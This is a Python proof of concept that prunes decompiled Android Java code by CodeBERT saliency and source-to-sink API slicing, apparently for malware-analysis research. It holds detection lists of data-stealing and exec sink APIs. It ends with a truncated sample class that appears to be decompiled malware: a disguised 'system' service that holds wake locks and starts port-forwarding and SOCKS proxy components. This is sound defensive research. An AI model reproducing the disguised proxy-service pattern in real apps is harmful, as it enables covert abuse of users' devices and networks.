#!/usr/bin/env python3
"""
Evidence-Guided Semantic Code Pruning (POC)

Pipeline:
  1. CodeBERT saliency
  2. Sensitive API source detection
  3. Sensitive/sink API detection
  4. Statement extraction
  5. Lightweight def-use graph
  6. Source -> sink path detection
  7. Backward slicing from sinks
  8. Forward slicing from sources
  9. Control + method context
 10. Saliency-guided budget filling
 11. Stage-by-stage diagnostics

This is a POC. Replace the lightweight parser with AST/Androguard/DFG later.
"""

import re
import math
from dataclasses import dataclass, field
from typing import Dict, List, Set, Tuple, Optional

import numpy as np
import torch
from transformers import AutoTokenizer, AutoModel

# ============================================================
# CONFIG
# ============================================================

DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")
MODEL_NAME = "microsoft/codebert-base"
# MODEL_NAME="all-MiniLM-L6-v2"
MAX_LEN = 512
STRIDE = 256
TOP_K_RATIO = 0.10
MIN_SEEDS = 4
KEEP_RATIO = 0.30
MAX_TOKENS = 512
BACKWARD_DEPTH = 8
FORWARD_DEPTH = 8

# ============================================================
# SECURITY KNOWLEDGE
# ============================================================

# # POC examples from sensitive_apis.csv.
# SENSITIVE_API_PATTERNS = {
#     "Landroid/location/LocationManager;->addProximityAlert",
#     "Landroid/location/LocationManager;->getBestProvider",
#     "Landroid/location/LocationManager;->getLastKnownLocation",
#     "Landroid/telephony/TelephonyManager;->getDeviceId",
#     "Landroid/telephony/TelephonyManager;->getSubscriberId",
# }

# # POC examples from sensitive_and_sink_apis.txt.
# SINK_API_PATTERNS = {
#     "android/net/wifi/WifiManager$MulticastLock;->acquire",
#     "com/android/phone/PhoneInterfaceManager;->getCellNetworkScanResults",
#     "android/net/sip/ISipService$Stub;->isOpened",
#     "com/android/phone/CallNotifier;->init",
#     "Landroid/telephony/TelephonyManager;->sendTextMessage",
#     "Ljava/net/HttpURLConnection;->connect",
#     "Ljava/io/OutputStream;->write",
# }

# # Additional Java names useful for the POC.
# SENSITIVE_METHOD_NAMES = {
#     "getDeviceId",
#     "getSubscriberId",
#     "getLastKnownLocation",
#     "getCellNetworkScanResults",
# }

# SINK_METHOD_NAMES = {
#     "sendTextMessage",
#     "write",
#     "execute",
#     "connect",
#     "openConnection",
#     "getOutputStream",
#     "Runtime.exec",
#     "startService",
# }

import csv
from pathlib import Path


def extract_method_name(pattern: str) -> str:
    """Extracts the method name from a signature (e.g., '...;->getLastKnownLocation' -> 'getLastKnownLocation')."""
    pattern = pattern.strip()
    if "->" in pattern:
        method_part = pattern.split("->")[-1]
        # Handle descriptors with parameters/return types if present (e.g., 'method(III)V' -> 'method')
        return method_part.split("(")[0]
    return pattern


def load_api_sets(csv_path: str, txt_path: str):
    sensitive_api_patterns = set()
    sensitive_method_names = set()

    sink_api_patterns = set()
    sink_method_names = set()

    # 1. Parse Sensitive APIs from CSV
    with open(csv_path, mode="r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            pattern = row["pattern"].strip()
            if pattern:
                sensitive_api_patterns.add(pattern)
                method_name = extract_method_name(pattern)
                if method_name:
                    sensitive_method_names.add(method_name)

    # 2. Parse Sink APIs from TXT
    with open(txt_path, mode="r", encoding="utf-8") as f:
        for line in f:
            pattern = line.strip()
            # Ignore empty lines and comments
            if pattern and not pattern.startswith("#"):
                sink_api_patterns.add(pattern)
                method_name = extract_method_name(pattern)
                if method_name:
                    sink_method_names.add(method_name)

    return (
        sensitive_api_patterns,
        sink_api_patterns,
        sensitive_method_names,
        sink_method_names,
    )


# Usage
CSV_FILE = "/mnt/SATA_3/akila/AK_PHD3/droidlens3/data/sensitive_apis.csv"
TXT_FILE = "/mnt/SATA_4/akila/LAMDAnalysis/LAMD/dataset/sensitive_and_sink_apis.txt"

(
    SENSITIVE_API_PATTERNS,
    SINK_API_PATTERNS,
    SENSITIVE_METHOD_NAMES,
    SINK_METHOD_NAMES,
) = load_api_sets(CSV_FILE, TXT_FILE)

# Debug Print Results
print(f"Loaded {len(SENSITIVE_API_PATTERNS)} Sensitive Patterns")
print(f"Loaded {len(SINK_API_PATTERNS)} Sink Patterns")
# print("Extracted Sensitive Method Names:", SENSITIVE_METHOD_NAMES)
# print("Extracted Sink Method Names:", SINK_METHOD_NAMES)

# ============================================================
# MODEL
# ============================================================

tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
model = AutoModel.from_pretrained(MODEL_NAME).to(DEVICE)
model.eval()

# ============================================================
# JAVA HELPERS
# ============================================================

IDENT_RE = re.compile(r"\b[A-Za-z_$][\w$]*\b")
ASSIGN_RE = re.compile(r"(?<![=!<>])(?:\+=|-=|\*=|/=|%=|=(?!=))")
METHOD_CALL_RE = re.compile(
    r"(?:\b[A-Za-z_$][\w$]*\s*\.\s*)?\b([A-Za-z_$][\w$]*)\s*\("
)
METHOD_DECL_RE = re.compile(
    r"(?:public|private|protected|static|final|abstract|synchronized|native|default)?\s*"
    r"(?:<[^>{}]+>\s*)?[\w$<>\[\], ?]+\s+"
    r"([A-Za-z_$][\w$]*)\s*\([^;{}]*\)\s*(?:throws\s+[^{]+)?\s*\{"
)
CONTROL_RE = re.compile(
    r"^\s*(if|else\s+if|else|for|while|do|switch|catch|try|finally)\b"
)
CLASS_RE = re.compile(r"\b(class|interface|enum|record)\b")
JAVA_KEYWORDS = {
    "if","else","for","while","do","switch","case","break","continue","return",
    "throw","throws","try","catch","finally","new","class","interface","enum",
    "record","extends","implements","public","private","protected","static",
    "final","abstract","synchronized","native","void","boolean","byte","char",
    "short","int","long","float","double","this","super","null","true","false",
    "instanceof","package","import","volatile","transient","assert","default",
    "strictfp",
}

@dataclass
class Statement:
    idx: int
    start_line: int
    end_line: int
    text: str
    kind: str = "statement"
    method_id: int = -1
    depth: int = 0
    defines: Set[str] = field(default_factory=set)
    uses: Set[str] = field(default_factory=set)
    calls: Set[str] = field(default_factory=set)
    source_hits: Set[str] = field(default_factory=set)
    sink_hits: Set[str] = field(default_factory=set)

def token_count(text: str) -> int:
    return len(tokenizer(text, add_special_tokens=False, truncation=False)["input_ids"])

def strip_line_comment(text: str) -> str:
    in_string = False
    in_char = False
    escaped = False
    for i, ch in enumerate(text):
        if escaped:
            escaped = False
            continue
        if ch == "\\" and (in_string or in_char):
            escaped = True
            continue
        if ch == '"' and not in_char:
            in_string = not in_string
            continue
        if ch == "'" and not in_string:
            in_char = not in_char
            continue
        if ch == "/" and not in_string and not in_char and i + 1 < len(text) and text[i + 1] == "/":
            return text[:i]
    return text

def sanitize_strings(text: str) -> str:
    chars = list(text)
    in_string = False
    in_char = False
    escaped = False
    i = 0
    while i < len(chars):
        c = chars[i]
        if escaped:
            chars[i] = " "
            escaped = False
            i += 1
            continue
        if c == "\\" and (in_string or in_char):
            chars[i] = " "
            escaped = True
            i += 1
            continue
        if c == '"' and not in_char:
            chars[i] = " "
            in_string = not in_string
            i += 1
            continue
        if c == "'" and not in_string:
            chars[i] = " "
            in_char = not in_char
            i += 1
            continue
        if in_string or in_char:
            if c != "\n":
                chars[i] = " "
        i += 1
    return "".join(chars)

def extract_identifiers(text: str) -> Set[str]:
    return {x for x in IDENT_RE.findall(text) if x not in JAVA_KEYWORDS}

def extract_calls(text: str) -> Set[str]:
    clean = sanitize_strings(text)
    return {
        m.group(1)
        for m in METHOD_CALL_RE.finditer(clean)
        if m.group(1) not in JAVA_KEYWORDS
    }

def is_structural_line(line: str) -> bool:
    s = line.strip()
    if not s:
        return True
    if re.fullmatch(r"[\{\}\(\)\[\],;]+", s):
        return True
    return False

def normalise_api_pattern(pattern: str) -> Tuple[str, str]:
    pattern = pattern.strip()
    pattern = pattern.replace("L", "", 1) if pattern.startswith("L") else pattern
    if ";->" in pattern:
        owner, method = pattern.split(";->", 1)
    elif "->" in pattern:
        owner, method = pattern.split("->", 1)
    else:
        owner, method = "", pattern
    return owner.replace("/", "."), method

def api_method_name(pattern: str) -> str:
    return normalise_api_pattern(pattern)[1]

def api_owner_simple(pattern: str) -> str:
    owner, _ = normalise_api_pattern(pattern)
    return owner.split(".")[-1].replace("$", ".")

def line_has_api(line: str, api_patterns: Set[str], fallback_methods: Set[str]) -> Set[str]:
    clean = sanitize_strings(strip_line_comment(line))
    hits = set()
    for pattern in api_patterns:
        method = api_method_name(pattern)
        owner = api_owner_simple(pattern)
        if re.search(rf"\b[A-Za-z_$][\w$]*\s*\.\s*{re.escape(method)}\s*\(", clean):
            hits.add(pattern)
        elif re.search(rf"\b{re.escape(owner)}\s*\.\s*{re.escape(method)}\s*\(", clean):
            hits.add(pattern)
    for method in fallback_methods:
        if re.search(rf"\b[A-Za-z_$][\w$]*\s*\.\s*{re.escape(method)}\s*\(", clean):
            hits.add(method)
    return hits

def line_has_sink(line: str) -> Set[str]:
    clean = sanitize_strings(strip_line_comment(line))
    hits = set()
    for pattern in SINK_API_PATTERNS:
        method = api_method_name(pattern)
        if re.search(rf"\b[A-Za-z_$][\w$]*\s*\.\s*{re.escape(method)}\s*\(", clean):
            hits.add(pattern)
    for method in SINK_METHOD_NAMES:
        if re.search(rf"\b[A-Za-z_$][\w$]*\s*\.\s*{re.escape(method.split('.')[-1])}\s*\(", clean):
            hits.add(method)
        elif method == "Runtime.exec" and "Runtime.exec(" in clean:
            hits.add(method)
    return hits

# ============================================================
# CODEBERT SALIENCY
# ============================================================

def char_to_line(pos: int, line_ends: np.ndarray) -> int:
    if len(line_ends) == 0:
        return 0
    return min(np.searchsorted(line_ends, pos, side="right"), len(line_ends) - 1)

def get_saliency_line_scores(
    java_codes: List[str],
    use_attention_fusion: bool = True,
    batch_size: int = 16,
) -> List[Tuple[np.ndarray, List[str]]]:
    if not java_codes:
        return []
    all_windows = []
    window_meta = []
    class_data = []
    for cls_idx, code in enumerate(java_codes):
        enc = tokenizer(code, return_offsets_mapping=True, add_special_tokens=False, truncation=False)
        ids = enc["input_ids"]
        offsets = enc["offset_mapping"]
        lines = code.splitlines(keepends=True)
        line_ends = np.cumsum([len(x) for x in lines])
        for start in range(0, len(ids), STRIDE):
            end = min(start + MAX_LEN - 2, len(ids))
            if end <= start:
                break
            all_windows.append([tokenizer.cls_token_id] + ids[start:end] + [tokenizer.sep_token_id])
            window_meta.append((cls_idx, start, end))
        class_data.append((offsets, line_ends, len(ids), lines))
    score_sum = [np.zeros(x[2], dtype=np.float32) for x in class_data]
    score_cnt = [np.zeros(x[2], dtype=np.int32) for x in class_data]
    for batch_start in range(0, len(all_windows), batch_size):
        batch = all_windows[batch_start:batch_start + batch_size]
        meta = window_meta[batch_start:batch_start + batch_size]
        max_len = max(len(x) for x in batch)
        input_ids = torch.full((len(batch), max_len), tokenizer.pad_token_id, dtype=torch.long, device=DEVICE)
        attention_mask = torch.zeros((len(batch), max_len), dtype=torch.long, device=DEVICE)
        for i, win in enumerate(batch):
            input_ids[i, :len(win)] = torch.tensor(win, dtype=torch.long, device=DEVICE)
            attention_mask[i, :len(win)] = 1
        embeddings = model.get_input_embeddings()(input_ids)
        embeddings.retain_grad()
        model.zero_grad(set_to_none=True)
        if DEVICE.type == "cuda":
            with torch.autocast(device_type="cuda", dtype=torch.float16):
                outputs = model(
                    inputs_embeds=embeddings,
                    attention_mask=attention_mask,
                    output_attentions=use_attention_fusion,
                )
                loss = outputs.last_hidden_state[:, 0, :].norm(dim=-1).sum()
        else:
            outputs = model(
                inputs_embeds=embeddings,
                attention_mask=attention_mask,
                output_attentions=use_attention_fusion,
            )
            loss = outputs.last_hidden_state[:, 0, :].norm(dim=-1).sum()
        loss.backward()
        saliency = (embeddings.float() * embeddings.grad.float()).norm(dim=-1)
        if use_attention_fusion and outputs.attentions is not None:
            layers = [x for x in [6,7,8,9] if x < len(outputs.attentions)]
            if layers:
                attn = torch.zeros(embeddings.size(0), embeddings.size(1), device=DEVICE)
                for layer in layers:
                    attn += outputs.attentions[layer].mean(dim=1)[:, 0, :]
                saliency *= attn / len(layers)
        scores = saliency.detach().cpu().numpy()
        for b, (_, start, end) in enumerate(meta):
            n = end - start
            score_sum[meta[b][0]][start:end] += scores[b, 1:n + 1]
            score_cnt[meta[b][0]][start:end] += 1
        del input_ids, attention_mask, embeddings, outputs, loss, saliency
        if DEVICE.type == "cuda":
            torch.cuda.empty_cache()
    results = []
    for cls_idx, (offsets, line_ends, total_tokens, lines) in enumerate(class_data):
        mask = score_cnt[cls_idx] > 0
        token_scores = np.zeros(total_tokens, dtype=np.float32)
        token_scores[mask] = score_sum[cls_idx][mask] / score_cnt[cls_idx][mask]
        line_scores = np.zeros(len(lines), dtype=np.float32)
        for token_idx, (a, b) in enumerate(offsets):
            if a == b == 0:
                continue
            line_scores[char_to_line(a, line_ends)] += token_scores[token_idx]
        results.append((line_scores, lines))
    return results

# ============================================================
# STATEMENTS
# ============================================================

def split_statements(lines: List[str]) -> List[Statement]:
    statements = []
    buffer = []
    start = None
    depth = 0
    method_id = -1
    idx = 0
    for line_idx, raw in enumerate(lines):
        clean_line = strip_line_comment(raw)
        stripped = clean_line.strip()
        if start is None and stripped:
            start = line_idx
            buffer = []
        if start is not None:
            buffer.append(raw)
        if METHOD_DECL_RE.search(clean_line):
            method_id += 1
        boundary = (
            ";" in clean_line
            or stripped.endswith("{")
            or stripped.endswith("}")
        )
        if boundary and start is not None:
            text = "".join(buffer)
            compact = " ".join(x.strip() for x in buffer if x.strip())
            if CONTROL_RE.search(compact):
                kind = "control"
            elif CLASS_RE.search(compact):
                kind = "class"
            elif METHOD_DECL_RE.search(compact):
                kind = "method"
            elif compact.startswith("return"):
                kind = "return"
            elif is_structural_line(compact):
                kind = "structural"
            else:
                kind = "statement"
            statements.append(Statement(
                idx=idx,
                start_line=start,
                end_line=line_idx,
                text=text,
                kind=kind,
                method_id=method_id,
                depth=depth,
            ))
            idx += 1
            buffer = []
            start = None
        depth += clean_line.count("{")
        depth -= clean_line.count("}")
        depth = max(0, depth)
    if buffer and start is not None:
        statements.append(Statement(
            idx=idx,
            start_line=start,
            end_line=len(lines)-1,
            text="".join(buffer),
            kind="statement",
            method_id=method_id,
            depth=depth,
        ))
    for stmt in statements:
        clean = sanitize_strings(strip_line_comment(" ".join(stmt.text.splitlines())))
        stmt.calls = extract_calls(clean)
        m = ASSIGN_RE.search(clean)
        if m:
            lhs = extract_identifiers(clean[:m.start()])
            stmt.defines = {sorted(lhs)[-1]} if lhs else set()
            stmt.uses = extract_identifiers(clean[m.end():]) - stmt.defines
        else:
            stmt.uses = extract_identifiers(clean)
    return statements

def attach_security_evidence(statements: List[Statement], lines: List[str]) -> None:
    for stmt in statements:
        stmt_text = "".join(lines[stmt.start_line:stmt.end_line + 1])
        stmt.source_hits = line_has_api(stmt_text, SENSITIVE_API_PATTERNS, SENSITIVE_METHOD_NAMES)
        stmt.sink_hits = line_has_sink(stmt_text)

# ============================================================
# GRAPH
# ============================================================

def build_graph(statements: List[Statement]) -> Tuple[Dict[int, Set[int]], Dict[int, Set[int]]]:
    backward = {s.idx: set() for s in statements}
    forward = {s.idx: set() for s in statements}
    last_def = {}
    method_decls = {}
    for s in statements:
        if s.kind == "method":
            match = METHOD_DECL_RE.search(s.text)
            if match:
                method_decls.setdefault(match.group(1), set()).add(s.idx)
        for var in s.uses:
            if var in last_def:
                backward[s.idx].add(last_def[var])
                forward[last_def[var]].add(s.idx)
        for var in s.defines:
            last_def[var] = s.idx
    for s in statements:
        for call in s.calls:
            for method_idx in method_decls.get(call, set()):
                backward[s.idx].add(method_idx)
                forward[method_idx].add(s.idx)
    return backward, forward

def find_control_context(statements: List[Statement], idx: int) -> Set[int]:
    target = statements[idx]
    return {
        s.idx for s in statements
        if s.idx < idx and s.kind == "control" and s.depth <= target.depth
    }

# ============================================================
# SECURITY PATHS
# ============================================================

def shortest_paths(
    starts: Set[int],
    targets: Set[int],
    forward: Dict[int, Set[int]],
) -> List[List[int]]:
    paths = []
    for start in starts:
        queue = [(start, [start])]
        visited = {start}
        while queue:
            node, path = queue.pop(0)
            if node in targets and node != start:
                paths.append(path)
                break
            for nxt in forward.get(node, set()):
                if nxt not in visited:
                    visited.add(nxt)
                    queue.append((nxt, path + [nxt]))
    return paths

def expand_backward(
    seeds: Set[int],
    backward: Dict[int, Set[int]],
    depth: int
) -> Tuple[Set[int], Dict[int, Set[str]]]:
    selected = set(seeds)
    reasons = {x: {"BACKWARD_SEED"} for x in seeds}
    frontier = set(seeds)
    for d in range(1, depth + 1):
        nxt = set()
        for node in frontier:
            for dep in backward.get(node, set()):
                if dep not in selected:
                    selected.add(dep)
                    reasons.setdefault(dep, set()).add(f"BACKWARD_{d}")
                    nxt.add(dep)
        frontier = nxt
        if not frontier:
            break
    return selected, reasons

def expand_forward(
    seeds: Set[int],
    forward: Dict[int, Set[int]],
    depth: int
) -> Tuple[Set[int], Dict[int, Set[str]]]:
    selected = set(seeds)
    reasons = {x: {"FORWARD_SEED"} for x in seeds}
    frontier = set(seeds)
    for d in range(1, depth + 1):
        nxt = set()
        for node in frontier:
            for dep in forward.get(node, set()):
                if dep not in selected:
                    selected.add(dep)
                    reasons.setdefault(dep, set()).add(f"FORWARD_{d}")
                    nxt.add(dep)
        frontier = nxt
        if not frontier:
            break
    return selected, reasons

# ============================================================
# MAIN PRUNER
# ============================================================

def evidence_guided_prune(
    class_source: str,
    keep_ratio: float = KEEP_RATIO,
    max_tokens: Optional[int] = MAX_TOKENS,
    top_k_ratio: float = TOP_K_RATIO,
    min_seeds: int = MIN_SEEDS,
    backward_depth: int = BACKWARD_DEPTH,
    forward_depth: int = FORWARD_DEPTH,
) -> str:

    lines = class_source.splitlines(keepends=True)
    original_tokens = token_count(class_source)

    print("\n" + "=" * 80)
    print("EVIDENCE-GUIDED SEMANTIC PRUNING POC")
    print("=" * 80)
    print(f"[INPUT] lines={len(lines)} tokens={original_tokens}")

    # --------------------------------------------------------
    # STAGE 1: CODEBERT SALIENCY
    # --------------------------------------------------------

    line_scores, _ = get_saliency_line_scores(
        [class_source],
        batch_size=16,
        use_attention_fusion=True,
    )[0]

    valid_saliency = [
        i for i in range(len(lines))
        if not is_structural_line(lines[i])
        and line_scores[i] > 0
    ]

    valid_saliency.sort(
        key=lambda i: line_scores[i],
        reverse=True
    )

    seed_count = min(
        len(valid_saliency),
        max(
            min_seeds,
            int(
                math.ceil(
                    len(lines) * top_k_ratio
                )
            )
        )
    )

    saliency_seeds = set(
        valid_saliency[:seed_count]
    )

    print("\n[STAGE 1] SALIENCY")
    print(f"[SALIENCY] valid candidates={len(valid_saliency)}")
    print(f"[SALIENCY] seeds={len(saliency_seeds)}")
    for i in valid_saliency[:15]:
        marker = "SEED" if i in saliency_seeds else ""
        print(
            f"  L{i+1:04d} "
            f"{marker:5s} "
            f"score={line_scores[i]:.6g} "
            f"| {lines[i].strip()}"
        )

    # --------------------------------------------------------
    # STAGE 2: STATEMENTS
    # --------------------------------------------------------

    statements = split_statements(lines)
    attach_security_evidence(statements, lines)

    print("\n[STAGE 2] STATEMENTS + SECURITY EVIDENCE")
    print(f"[STATEMENTS] count={len(statements)}")

    source_nodes = set()
    sink_nodes = set()

    for s in statements:
        if s.source_hits:
            source_nodes.add(s.idx)
        if s.sink_hits:
            sink_nodes.add(s.idx)

        if s.source_hits or s.sink_hits:
            print(
                f"  S{s.idx:04d} "
                f"L{s.start_line+1:04d}-L{s.end_line+1:04d} "
                f"SOURCE={list(s.source_hits)} "
                f"SINK={list(s.sink_hits)} "
                f"| {' '.join(s.text.split())[:160]}"
            )

    print(f"[SECURITY] source nodes={sorted(source_nodes)}")
    print(f"[SECURITY] sink nodes={sorted(sink_nodes)}")

    # --------------------------------------------------------
    # STAGE 3: DEPENDENCY GRAPH
    # --------------------------------------------------------

    backward, forward = build_graph(statements)

    print("\n[STAGE 3] DEPENDENCY GRAPH")

    for s in statements:
        if (
            backward[s.idx]
            or forward[s.idx]
        ) and (
            s.idx in source_nodes
            or s.idx in sink_nodes
            or s.idx in {
                x for seed in saliency_seeds
                for x in range(len(statements))
                if statements[x].start_line <= seed <= statements[x].end_line
            }
        ):
            print(
                f"  S{s.idx:04d} "
                f"BACK={sorted(backward[s.idx])} "
                f"FORWARD={sorted(forward[s.idx])}"
            )

    # --------------------------------------------------------
    # STAGE 4: SOURCE -> SINK PATHS
    # --------------------------------------------------------

    print("\n[STAGE 4] SOURCE -> SINK ANALYSIS")

    paths = shortest_paths(
        source_nodes,
        sink_nodes,
        forward,
    )

    path_nodes = set()

    if paths:
        for path in paths:
            path_nodes.update(path)
            print(
                "  PATH: "
                + " -> ".join(
                    f"S{x}"
                    for x in path
                )
            )
            for x in path:
                s = statements[x]
                print(
                    f"    S{x:04d} "
                    f"L{s.start_line+1:04d}-"
                    f"L{s.end_line+1:04d} "
                    f"| {' '.join(s.text.split())[:150]}"
                )
    else:
        print("  No source -> sink path detected.")

    # --------------------------------------------------------
    # STAGE 5: SECURITY SLICES
    # --------------------------------------------------------

    print("\n[STAGE 5] BACKWARD/FORWARD SECURITY SLICES")

    selected = set(path_nodes)
    reasons: Dict[int, Set[str]] = {
        x: {"SOURCE_SINK_PATH"}
        for x in path_nodes
    }

    # Sources expand forward.
    forward_from_sources, forward_reasons = expand_forward(
        source_nodes,
        forward,
        forward_depth,
    )

    for idx in forward_from_sources:
        selected.add(idx)
        reasons.setdefault(idx, set()).update(
            forward_reasons.get(idx, set())
        )
        reasons[idx].add("SOURCE_FORWARD")

    # Sinks expand backward.
    backward_from_sinks, backward_reasons = expand_backward(
        sink_nodes,
        backward,
        backward_depth,
    )

    for idx in backward_from_sinks:
        selected.add(idx)
        reasons.setdefault(idx, set()).update(
            backward_reasons.get(idx, set())
        )
        reasons[idx].add("SINK_BACKWARD")

    print(
        f"[SECURITY SLICE] "
        f"source-forward={len(forward_from_sources)} "
        f"sink-backward={len(backward_from_sinks)} "
        f"path={len(path_nodes)}"
    )

    # --------------------------------------------------------
    # STAGE 6: SALIENCY SEEDS -> STATEMENTS
    # --------------------------------------------------------

    print("\n[STAGE 6] SALIENCY SEEDS -> SEMANTIC CONTEXT")

    seed_statements = set()

    for s in statements:
        if any(
            s.start_line <= line <= s.end_line
            for line in saliency_seeds
        ):
            seed_statements.add(s.idx)

    print(
        f"[SALIENCY] seed statements="
        f"{sorted(seed_statements)}"
    )

    for idx in seed_statements:
        selected.add(idx)
        reasons.setdefault(
            idx,
            set()
        ).add(
            "SALIENCY_SEED"
        )

        # Backward from saliency seed.
        bset, breasons = expand_backward(
            {idx},
            backward,
            min(4, backward_depth),
        )

        for x in bset:
            selected.add(x)
            reasons.setdefault(
                x,
                set()
            ).update(
                breasons.get(
                    x,
                    set()
                )
            )
            reasons[x].add(
                "SALIENCY_BACKWARD"
            )

        # Forward from saliency seed.
        fset, freasons = expand_forward(
            {idx},
            forward,
            min(4, forward_depth),
        )

        for x in fset:
            selected.add(x)
            reasons.setdefault(
                x,
                set()
            ).update(
                freasons.get(
                    x,
                    set()
                )
            )
            reasons[x].add(
                "SALIENCY_FORWARD"
            )

    # --------------------------------------------------------
    # STAGE 7: CONTROL + METHOD CONTEXT
    # --------------------------------------------------------

    print("\n[STAGE 7] CONTROL + METHOD CONTEXT")

    context_nodes = set()

    for idx in list(selected):

        controls = find_control_context(
            statements,
            idx
        )

        context_nodes.update(
            controls
        )

        for c in controls:
            selected.add(c)
            reasons.setdefault(
                c,
                set()
            ).add(
                "CONTROL_CONTEXT"
            )

    # Preserve method declaration for selected statements.
    method_ids = {
        statements[x].method_id
        for x in selected
        if 0 <= x < len(statements)
    }

    for s in statements:
        if (
            s.method_id in method_ids
            and s.kind == "method"
        ):
            selected.add(s.idx)
            reasons.setdefault(
                s.idx,
                set()
            ).add(
                "METHOD_CONTEXT"
            )

    print(
        f"[CONTEXT] control nodes="
        f"{len(context_nodes)}"
    )

    # --------------------------------------------------------
    # STAGE 8: STRUCTURAL COMPLETION
    # --------------------------------------------------------

    print("\n[STAGE 8] STRUCTURAL COMPLETION")

    semantic_lines = set()

    for idx in selected:
        s = statements[idx]
        semantic_lines.update(
            range(
                s.start_line,
                s.end_line + 1
            )
        )

    # Always preserve package/class boundary.
    for i, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith("package "):
            semantic_lines.add(i)
        if CLASS_RE.search(stripped):
            semantic_lines.add(i)

    # Preserve closing braces for selected structural regions.
    selected_line_ranges = list(
        semantic_lines
    )

    for i in range(
        len(lines)
    ):
        if (
            lines[i].strip() == "}"
            and any(
                abs(i - x) <= 1
                for x in selected_line_ranges
            )
        ):
            semantic_lines.add(i)

    print(
        f"[STRUCTURE] semantic lines="
        f"{len(semantic_lines)}"
    )

    # --------------------------------------------------------
    # STAGE 9: SECURITY PRIORITY REPORT
    # --------------------------------------------------------

    print("\n[STAGE 9] RETENTION REASONS")

    for idx in sorted(
        selected
    ):

        s = statements[idx]

        print(
            f"  S{idx:04d} "
            f"L{s.start_line+1:04d}-"
            f"L{s.end_line+1:04d} "
            f"REASON="
            f"{','.join(sorted(reasons.get(idx, set())))} "
            f"| {' '.join(s.text.split())[:160]}"
        )

    # --------------------------------------------------------
    # STAGE 10: BUDGET
    # --------------------------------------------------------

    print("\n[STAGE 10] TOKEN BUDGET")

    original = token_count(
        class_source
    )

    target = int(
        math.ceil(
            original
            * keep_ratio
        )
    )

    if max_tokens is not None:
        target = min(
            target,
            max_tokens
        )

    line_costs = np.asarray([
        max(
            1,
            token_count(line)
        )
        for line in lines
    ])

    keep = set(
        semantic_lines
    )

    used = int(
        line_costs[
            list(keep)
        ].sum()
    ) if keep else 0

    print(
        f"Original tokens = {original}"
    )

    print(
        f"Target tokens   = {target}"
    )

    print(
        f"Semantic tokens = {used}"
    )

    # Important:
    # Never discard security dependencies just to hit target.
    if used < target:

        candidates = [
            int(i)
            for i in np.argsort(
                line_scores
            )[::-1]
            if (
                int(i) not in keep
                and not is_structural_line(
                    lines[int(i)]
                )
            )
        ]

        for idx in candidates:

            cost = int(
                line_costs[idx]
            )

            if (
                used + cost
                > target
            ):
                continue

            keep.add(idx)
            used += cost

            if used >= target:
                break

    print(
        f"Final tokens    = {used}"
    )

    # --------------------------------------------------------
    # STAGE 11: FINAL LINE REPORT
    # --------------------------------------------------------

    print("\n[STAGE 11] FINAL RETENTION")

    for i in sorted(
        keep
    ):

        print(
            f"  KEEP L{i+1:04d} "
            f"score={line_scores[i]:.6g} "
            f"| {lines[i].strip()}"
        )

    dropped = [
        i
        for i in range(
            len(lines)
        )
        if i not in keep
    ]

    print(
        f"\n[DROPPED] "
        f"{len(dropped)} lines"
    )

    for i in dropped[:40]:

        print(
            f"  DROP L{i+1:04d} "
            f"score={line_scores[i]:.6g} "
            f"| {lines[i].strip()}"
        )

    # --------------------------------------------------------
    # FINAL SOURCE
    # --------------------------------------------------------

    output = []
    last = -2

    for i in sorted(
        keep
    ):

        if i > last + 1:
            output.append(
                "// ... pruned ...\n"
            )

        output.append(
            lines[i]
        )

        last = i

    output = "".join(
        output
    )

    output_tokens = token_count(
        output
    )

    reduction = (
        100.0
        * (
            1.0
            -
            output_tokens
            /
            max(
                1,
                original
            )
        )
    )

    print(
        "\n"
        + "=" * 80
    )

    print(
        "FINAL RESULT"
    )

    print(
        "=" * 80
    )

    print(
        f"Input tokens  : "
        f"{original}"
    )

    print(
        f"Output tokens : "
        f"{output_tokens}"
    )

    print(
        f"Reduction     : "
        f"{reduction:.2f}%"
    )

    print(
        f"Input lines   : "
        f"{len(lines)}"
    )

    print(
        f"Output lines  : "
        f"{len(keep)}"
    )

    print(
        "\n"
        + "=" * 80
    )

    print(
        "PRUNED JAVA"
    )

    print(
        "=" * 80
    )

    print(
        output
    )

    return output


# ============================================================
# SAME DUMMY CLASS
# ============================================================

DUMMY_CLASS = r'''
package android.system.sa;

import android.R;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.system.ap.g;
import com.my.es.target.ads.MyTargetVideoView;
import com.my.es.target.nativeads.banners.NavigationType;
import org.json.JSONObject;

/* loaded from: classes2.dex */
public class SS extends Service {
    private Service a;
    private PowerManager b;
    private PowerManager.WakeLock c;
    private WifiManager.WifiLock d;
    private JSONObject e;

    class a extends AsyncTask<Integer, Void, Void> {
        a() {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* renamed from: a, reason: merged with bridge method [inline-methods] */
        public Void doInBackground(Integer... numArr) {
            try {
                android.system.f.a.a(SS.this.a, "starting", null);
                b.a("PortForwardingR.start");
                c.a(SS.this.a, SS.this.e);
                b.a("SOCKS.start");
                d.a(SS.this.a, SS.this.e);
            } catch (Exception e) {
                android.system.f.a.a(SS.this.a, "exit", e.toString());
                e.printStackTrace();
                b.a(e.toString());
                SS.this.a.stopSelf();
                System.exit(0);
            }
            return null;
        }
    }

    private void a() {
        try {
            this.c = ((PowerManager) getSystemService("power")).newWakeLock(1, "lock");
            this.c.acquire();
            this.d = ((WifiManager) getSystemService("wifi")).createWifiLock(1, "lock");
            this.d.acquire();
        } catch (Exception e) {
            System.exit(0);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str) {
        b.a("closing socks from " + str);
        android.system.f.a.a(this.a, "exit", str);
        b();
        c.a();
        if (this.a != null) {
            this.a.stopForeground(true);
        }
        this.a.stopSelf();
        System.exit(0);
    }

    private Bitmap b(String str) {
        if (str.equalsIgnoreCase("drive") || str.equalsIgnoreCase("gmail") || str.equalsIgnoreCase("music") || str.equalsIgnoreCase("services") || str.equalsIgnoreCase(NavigationType.STORE) || str.equalsIgnoreCase("youtube")) {
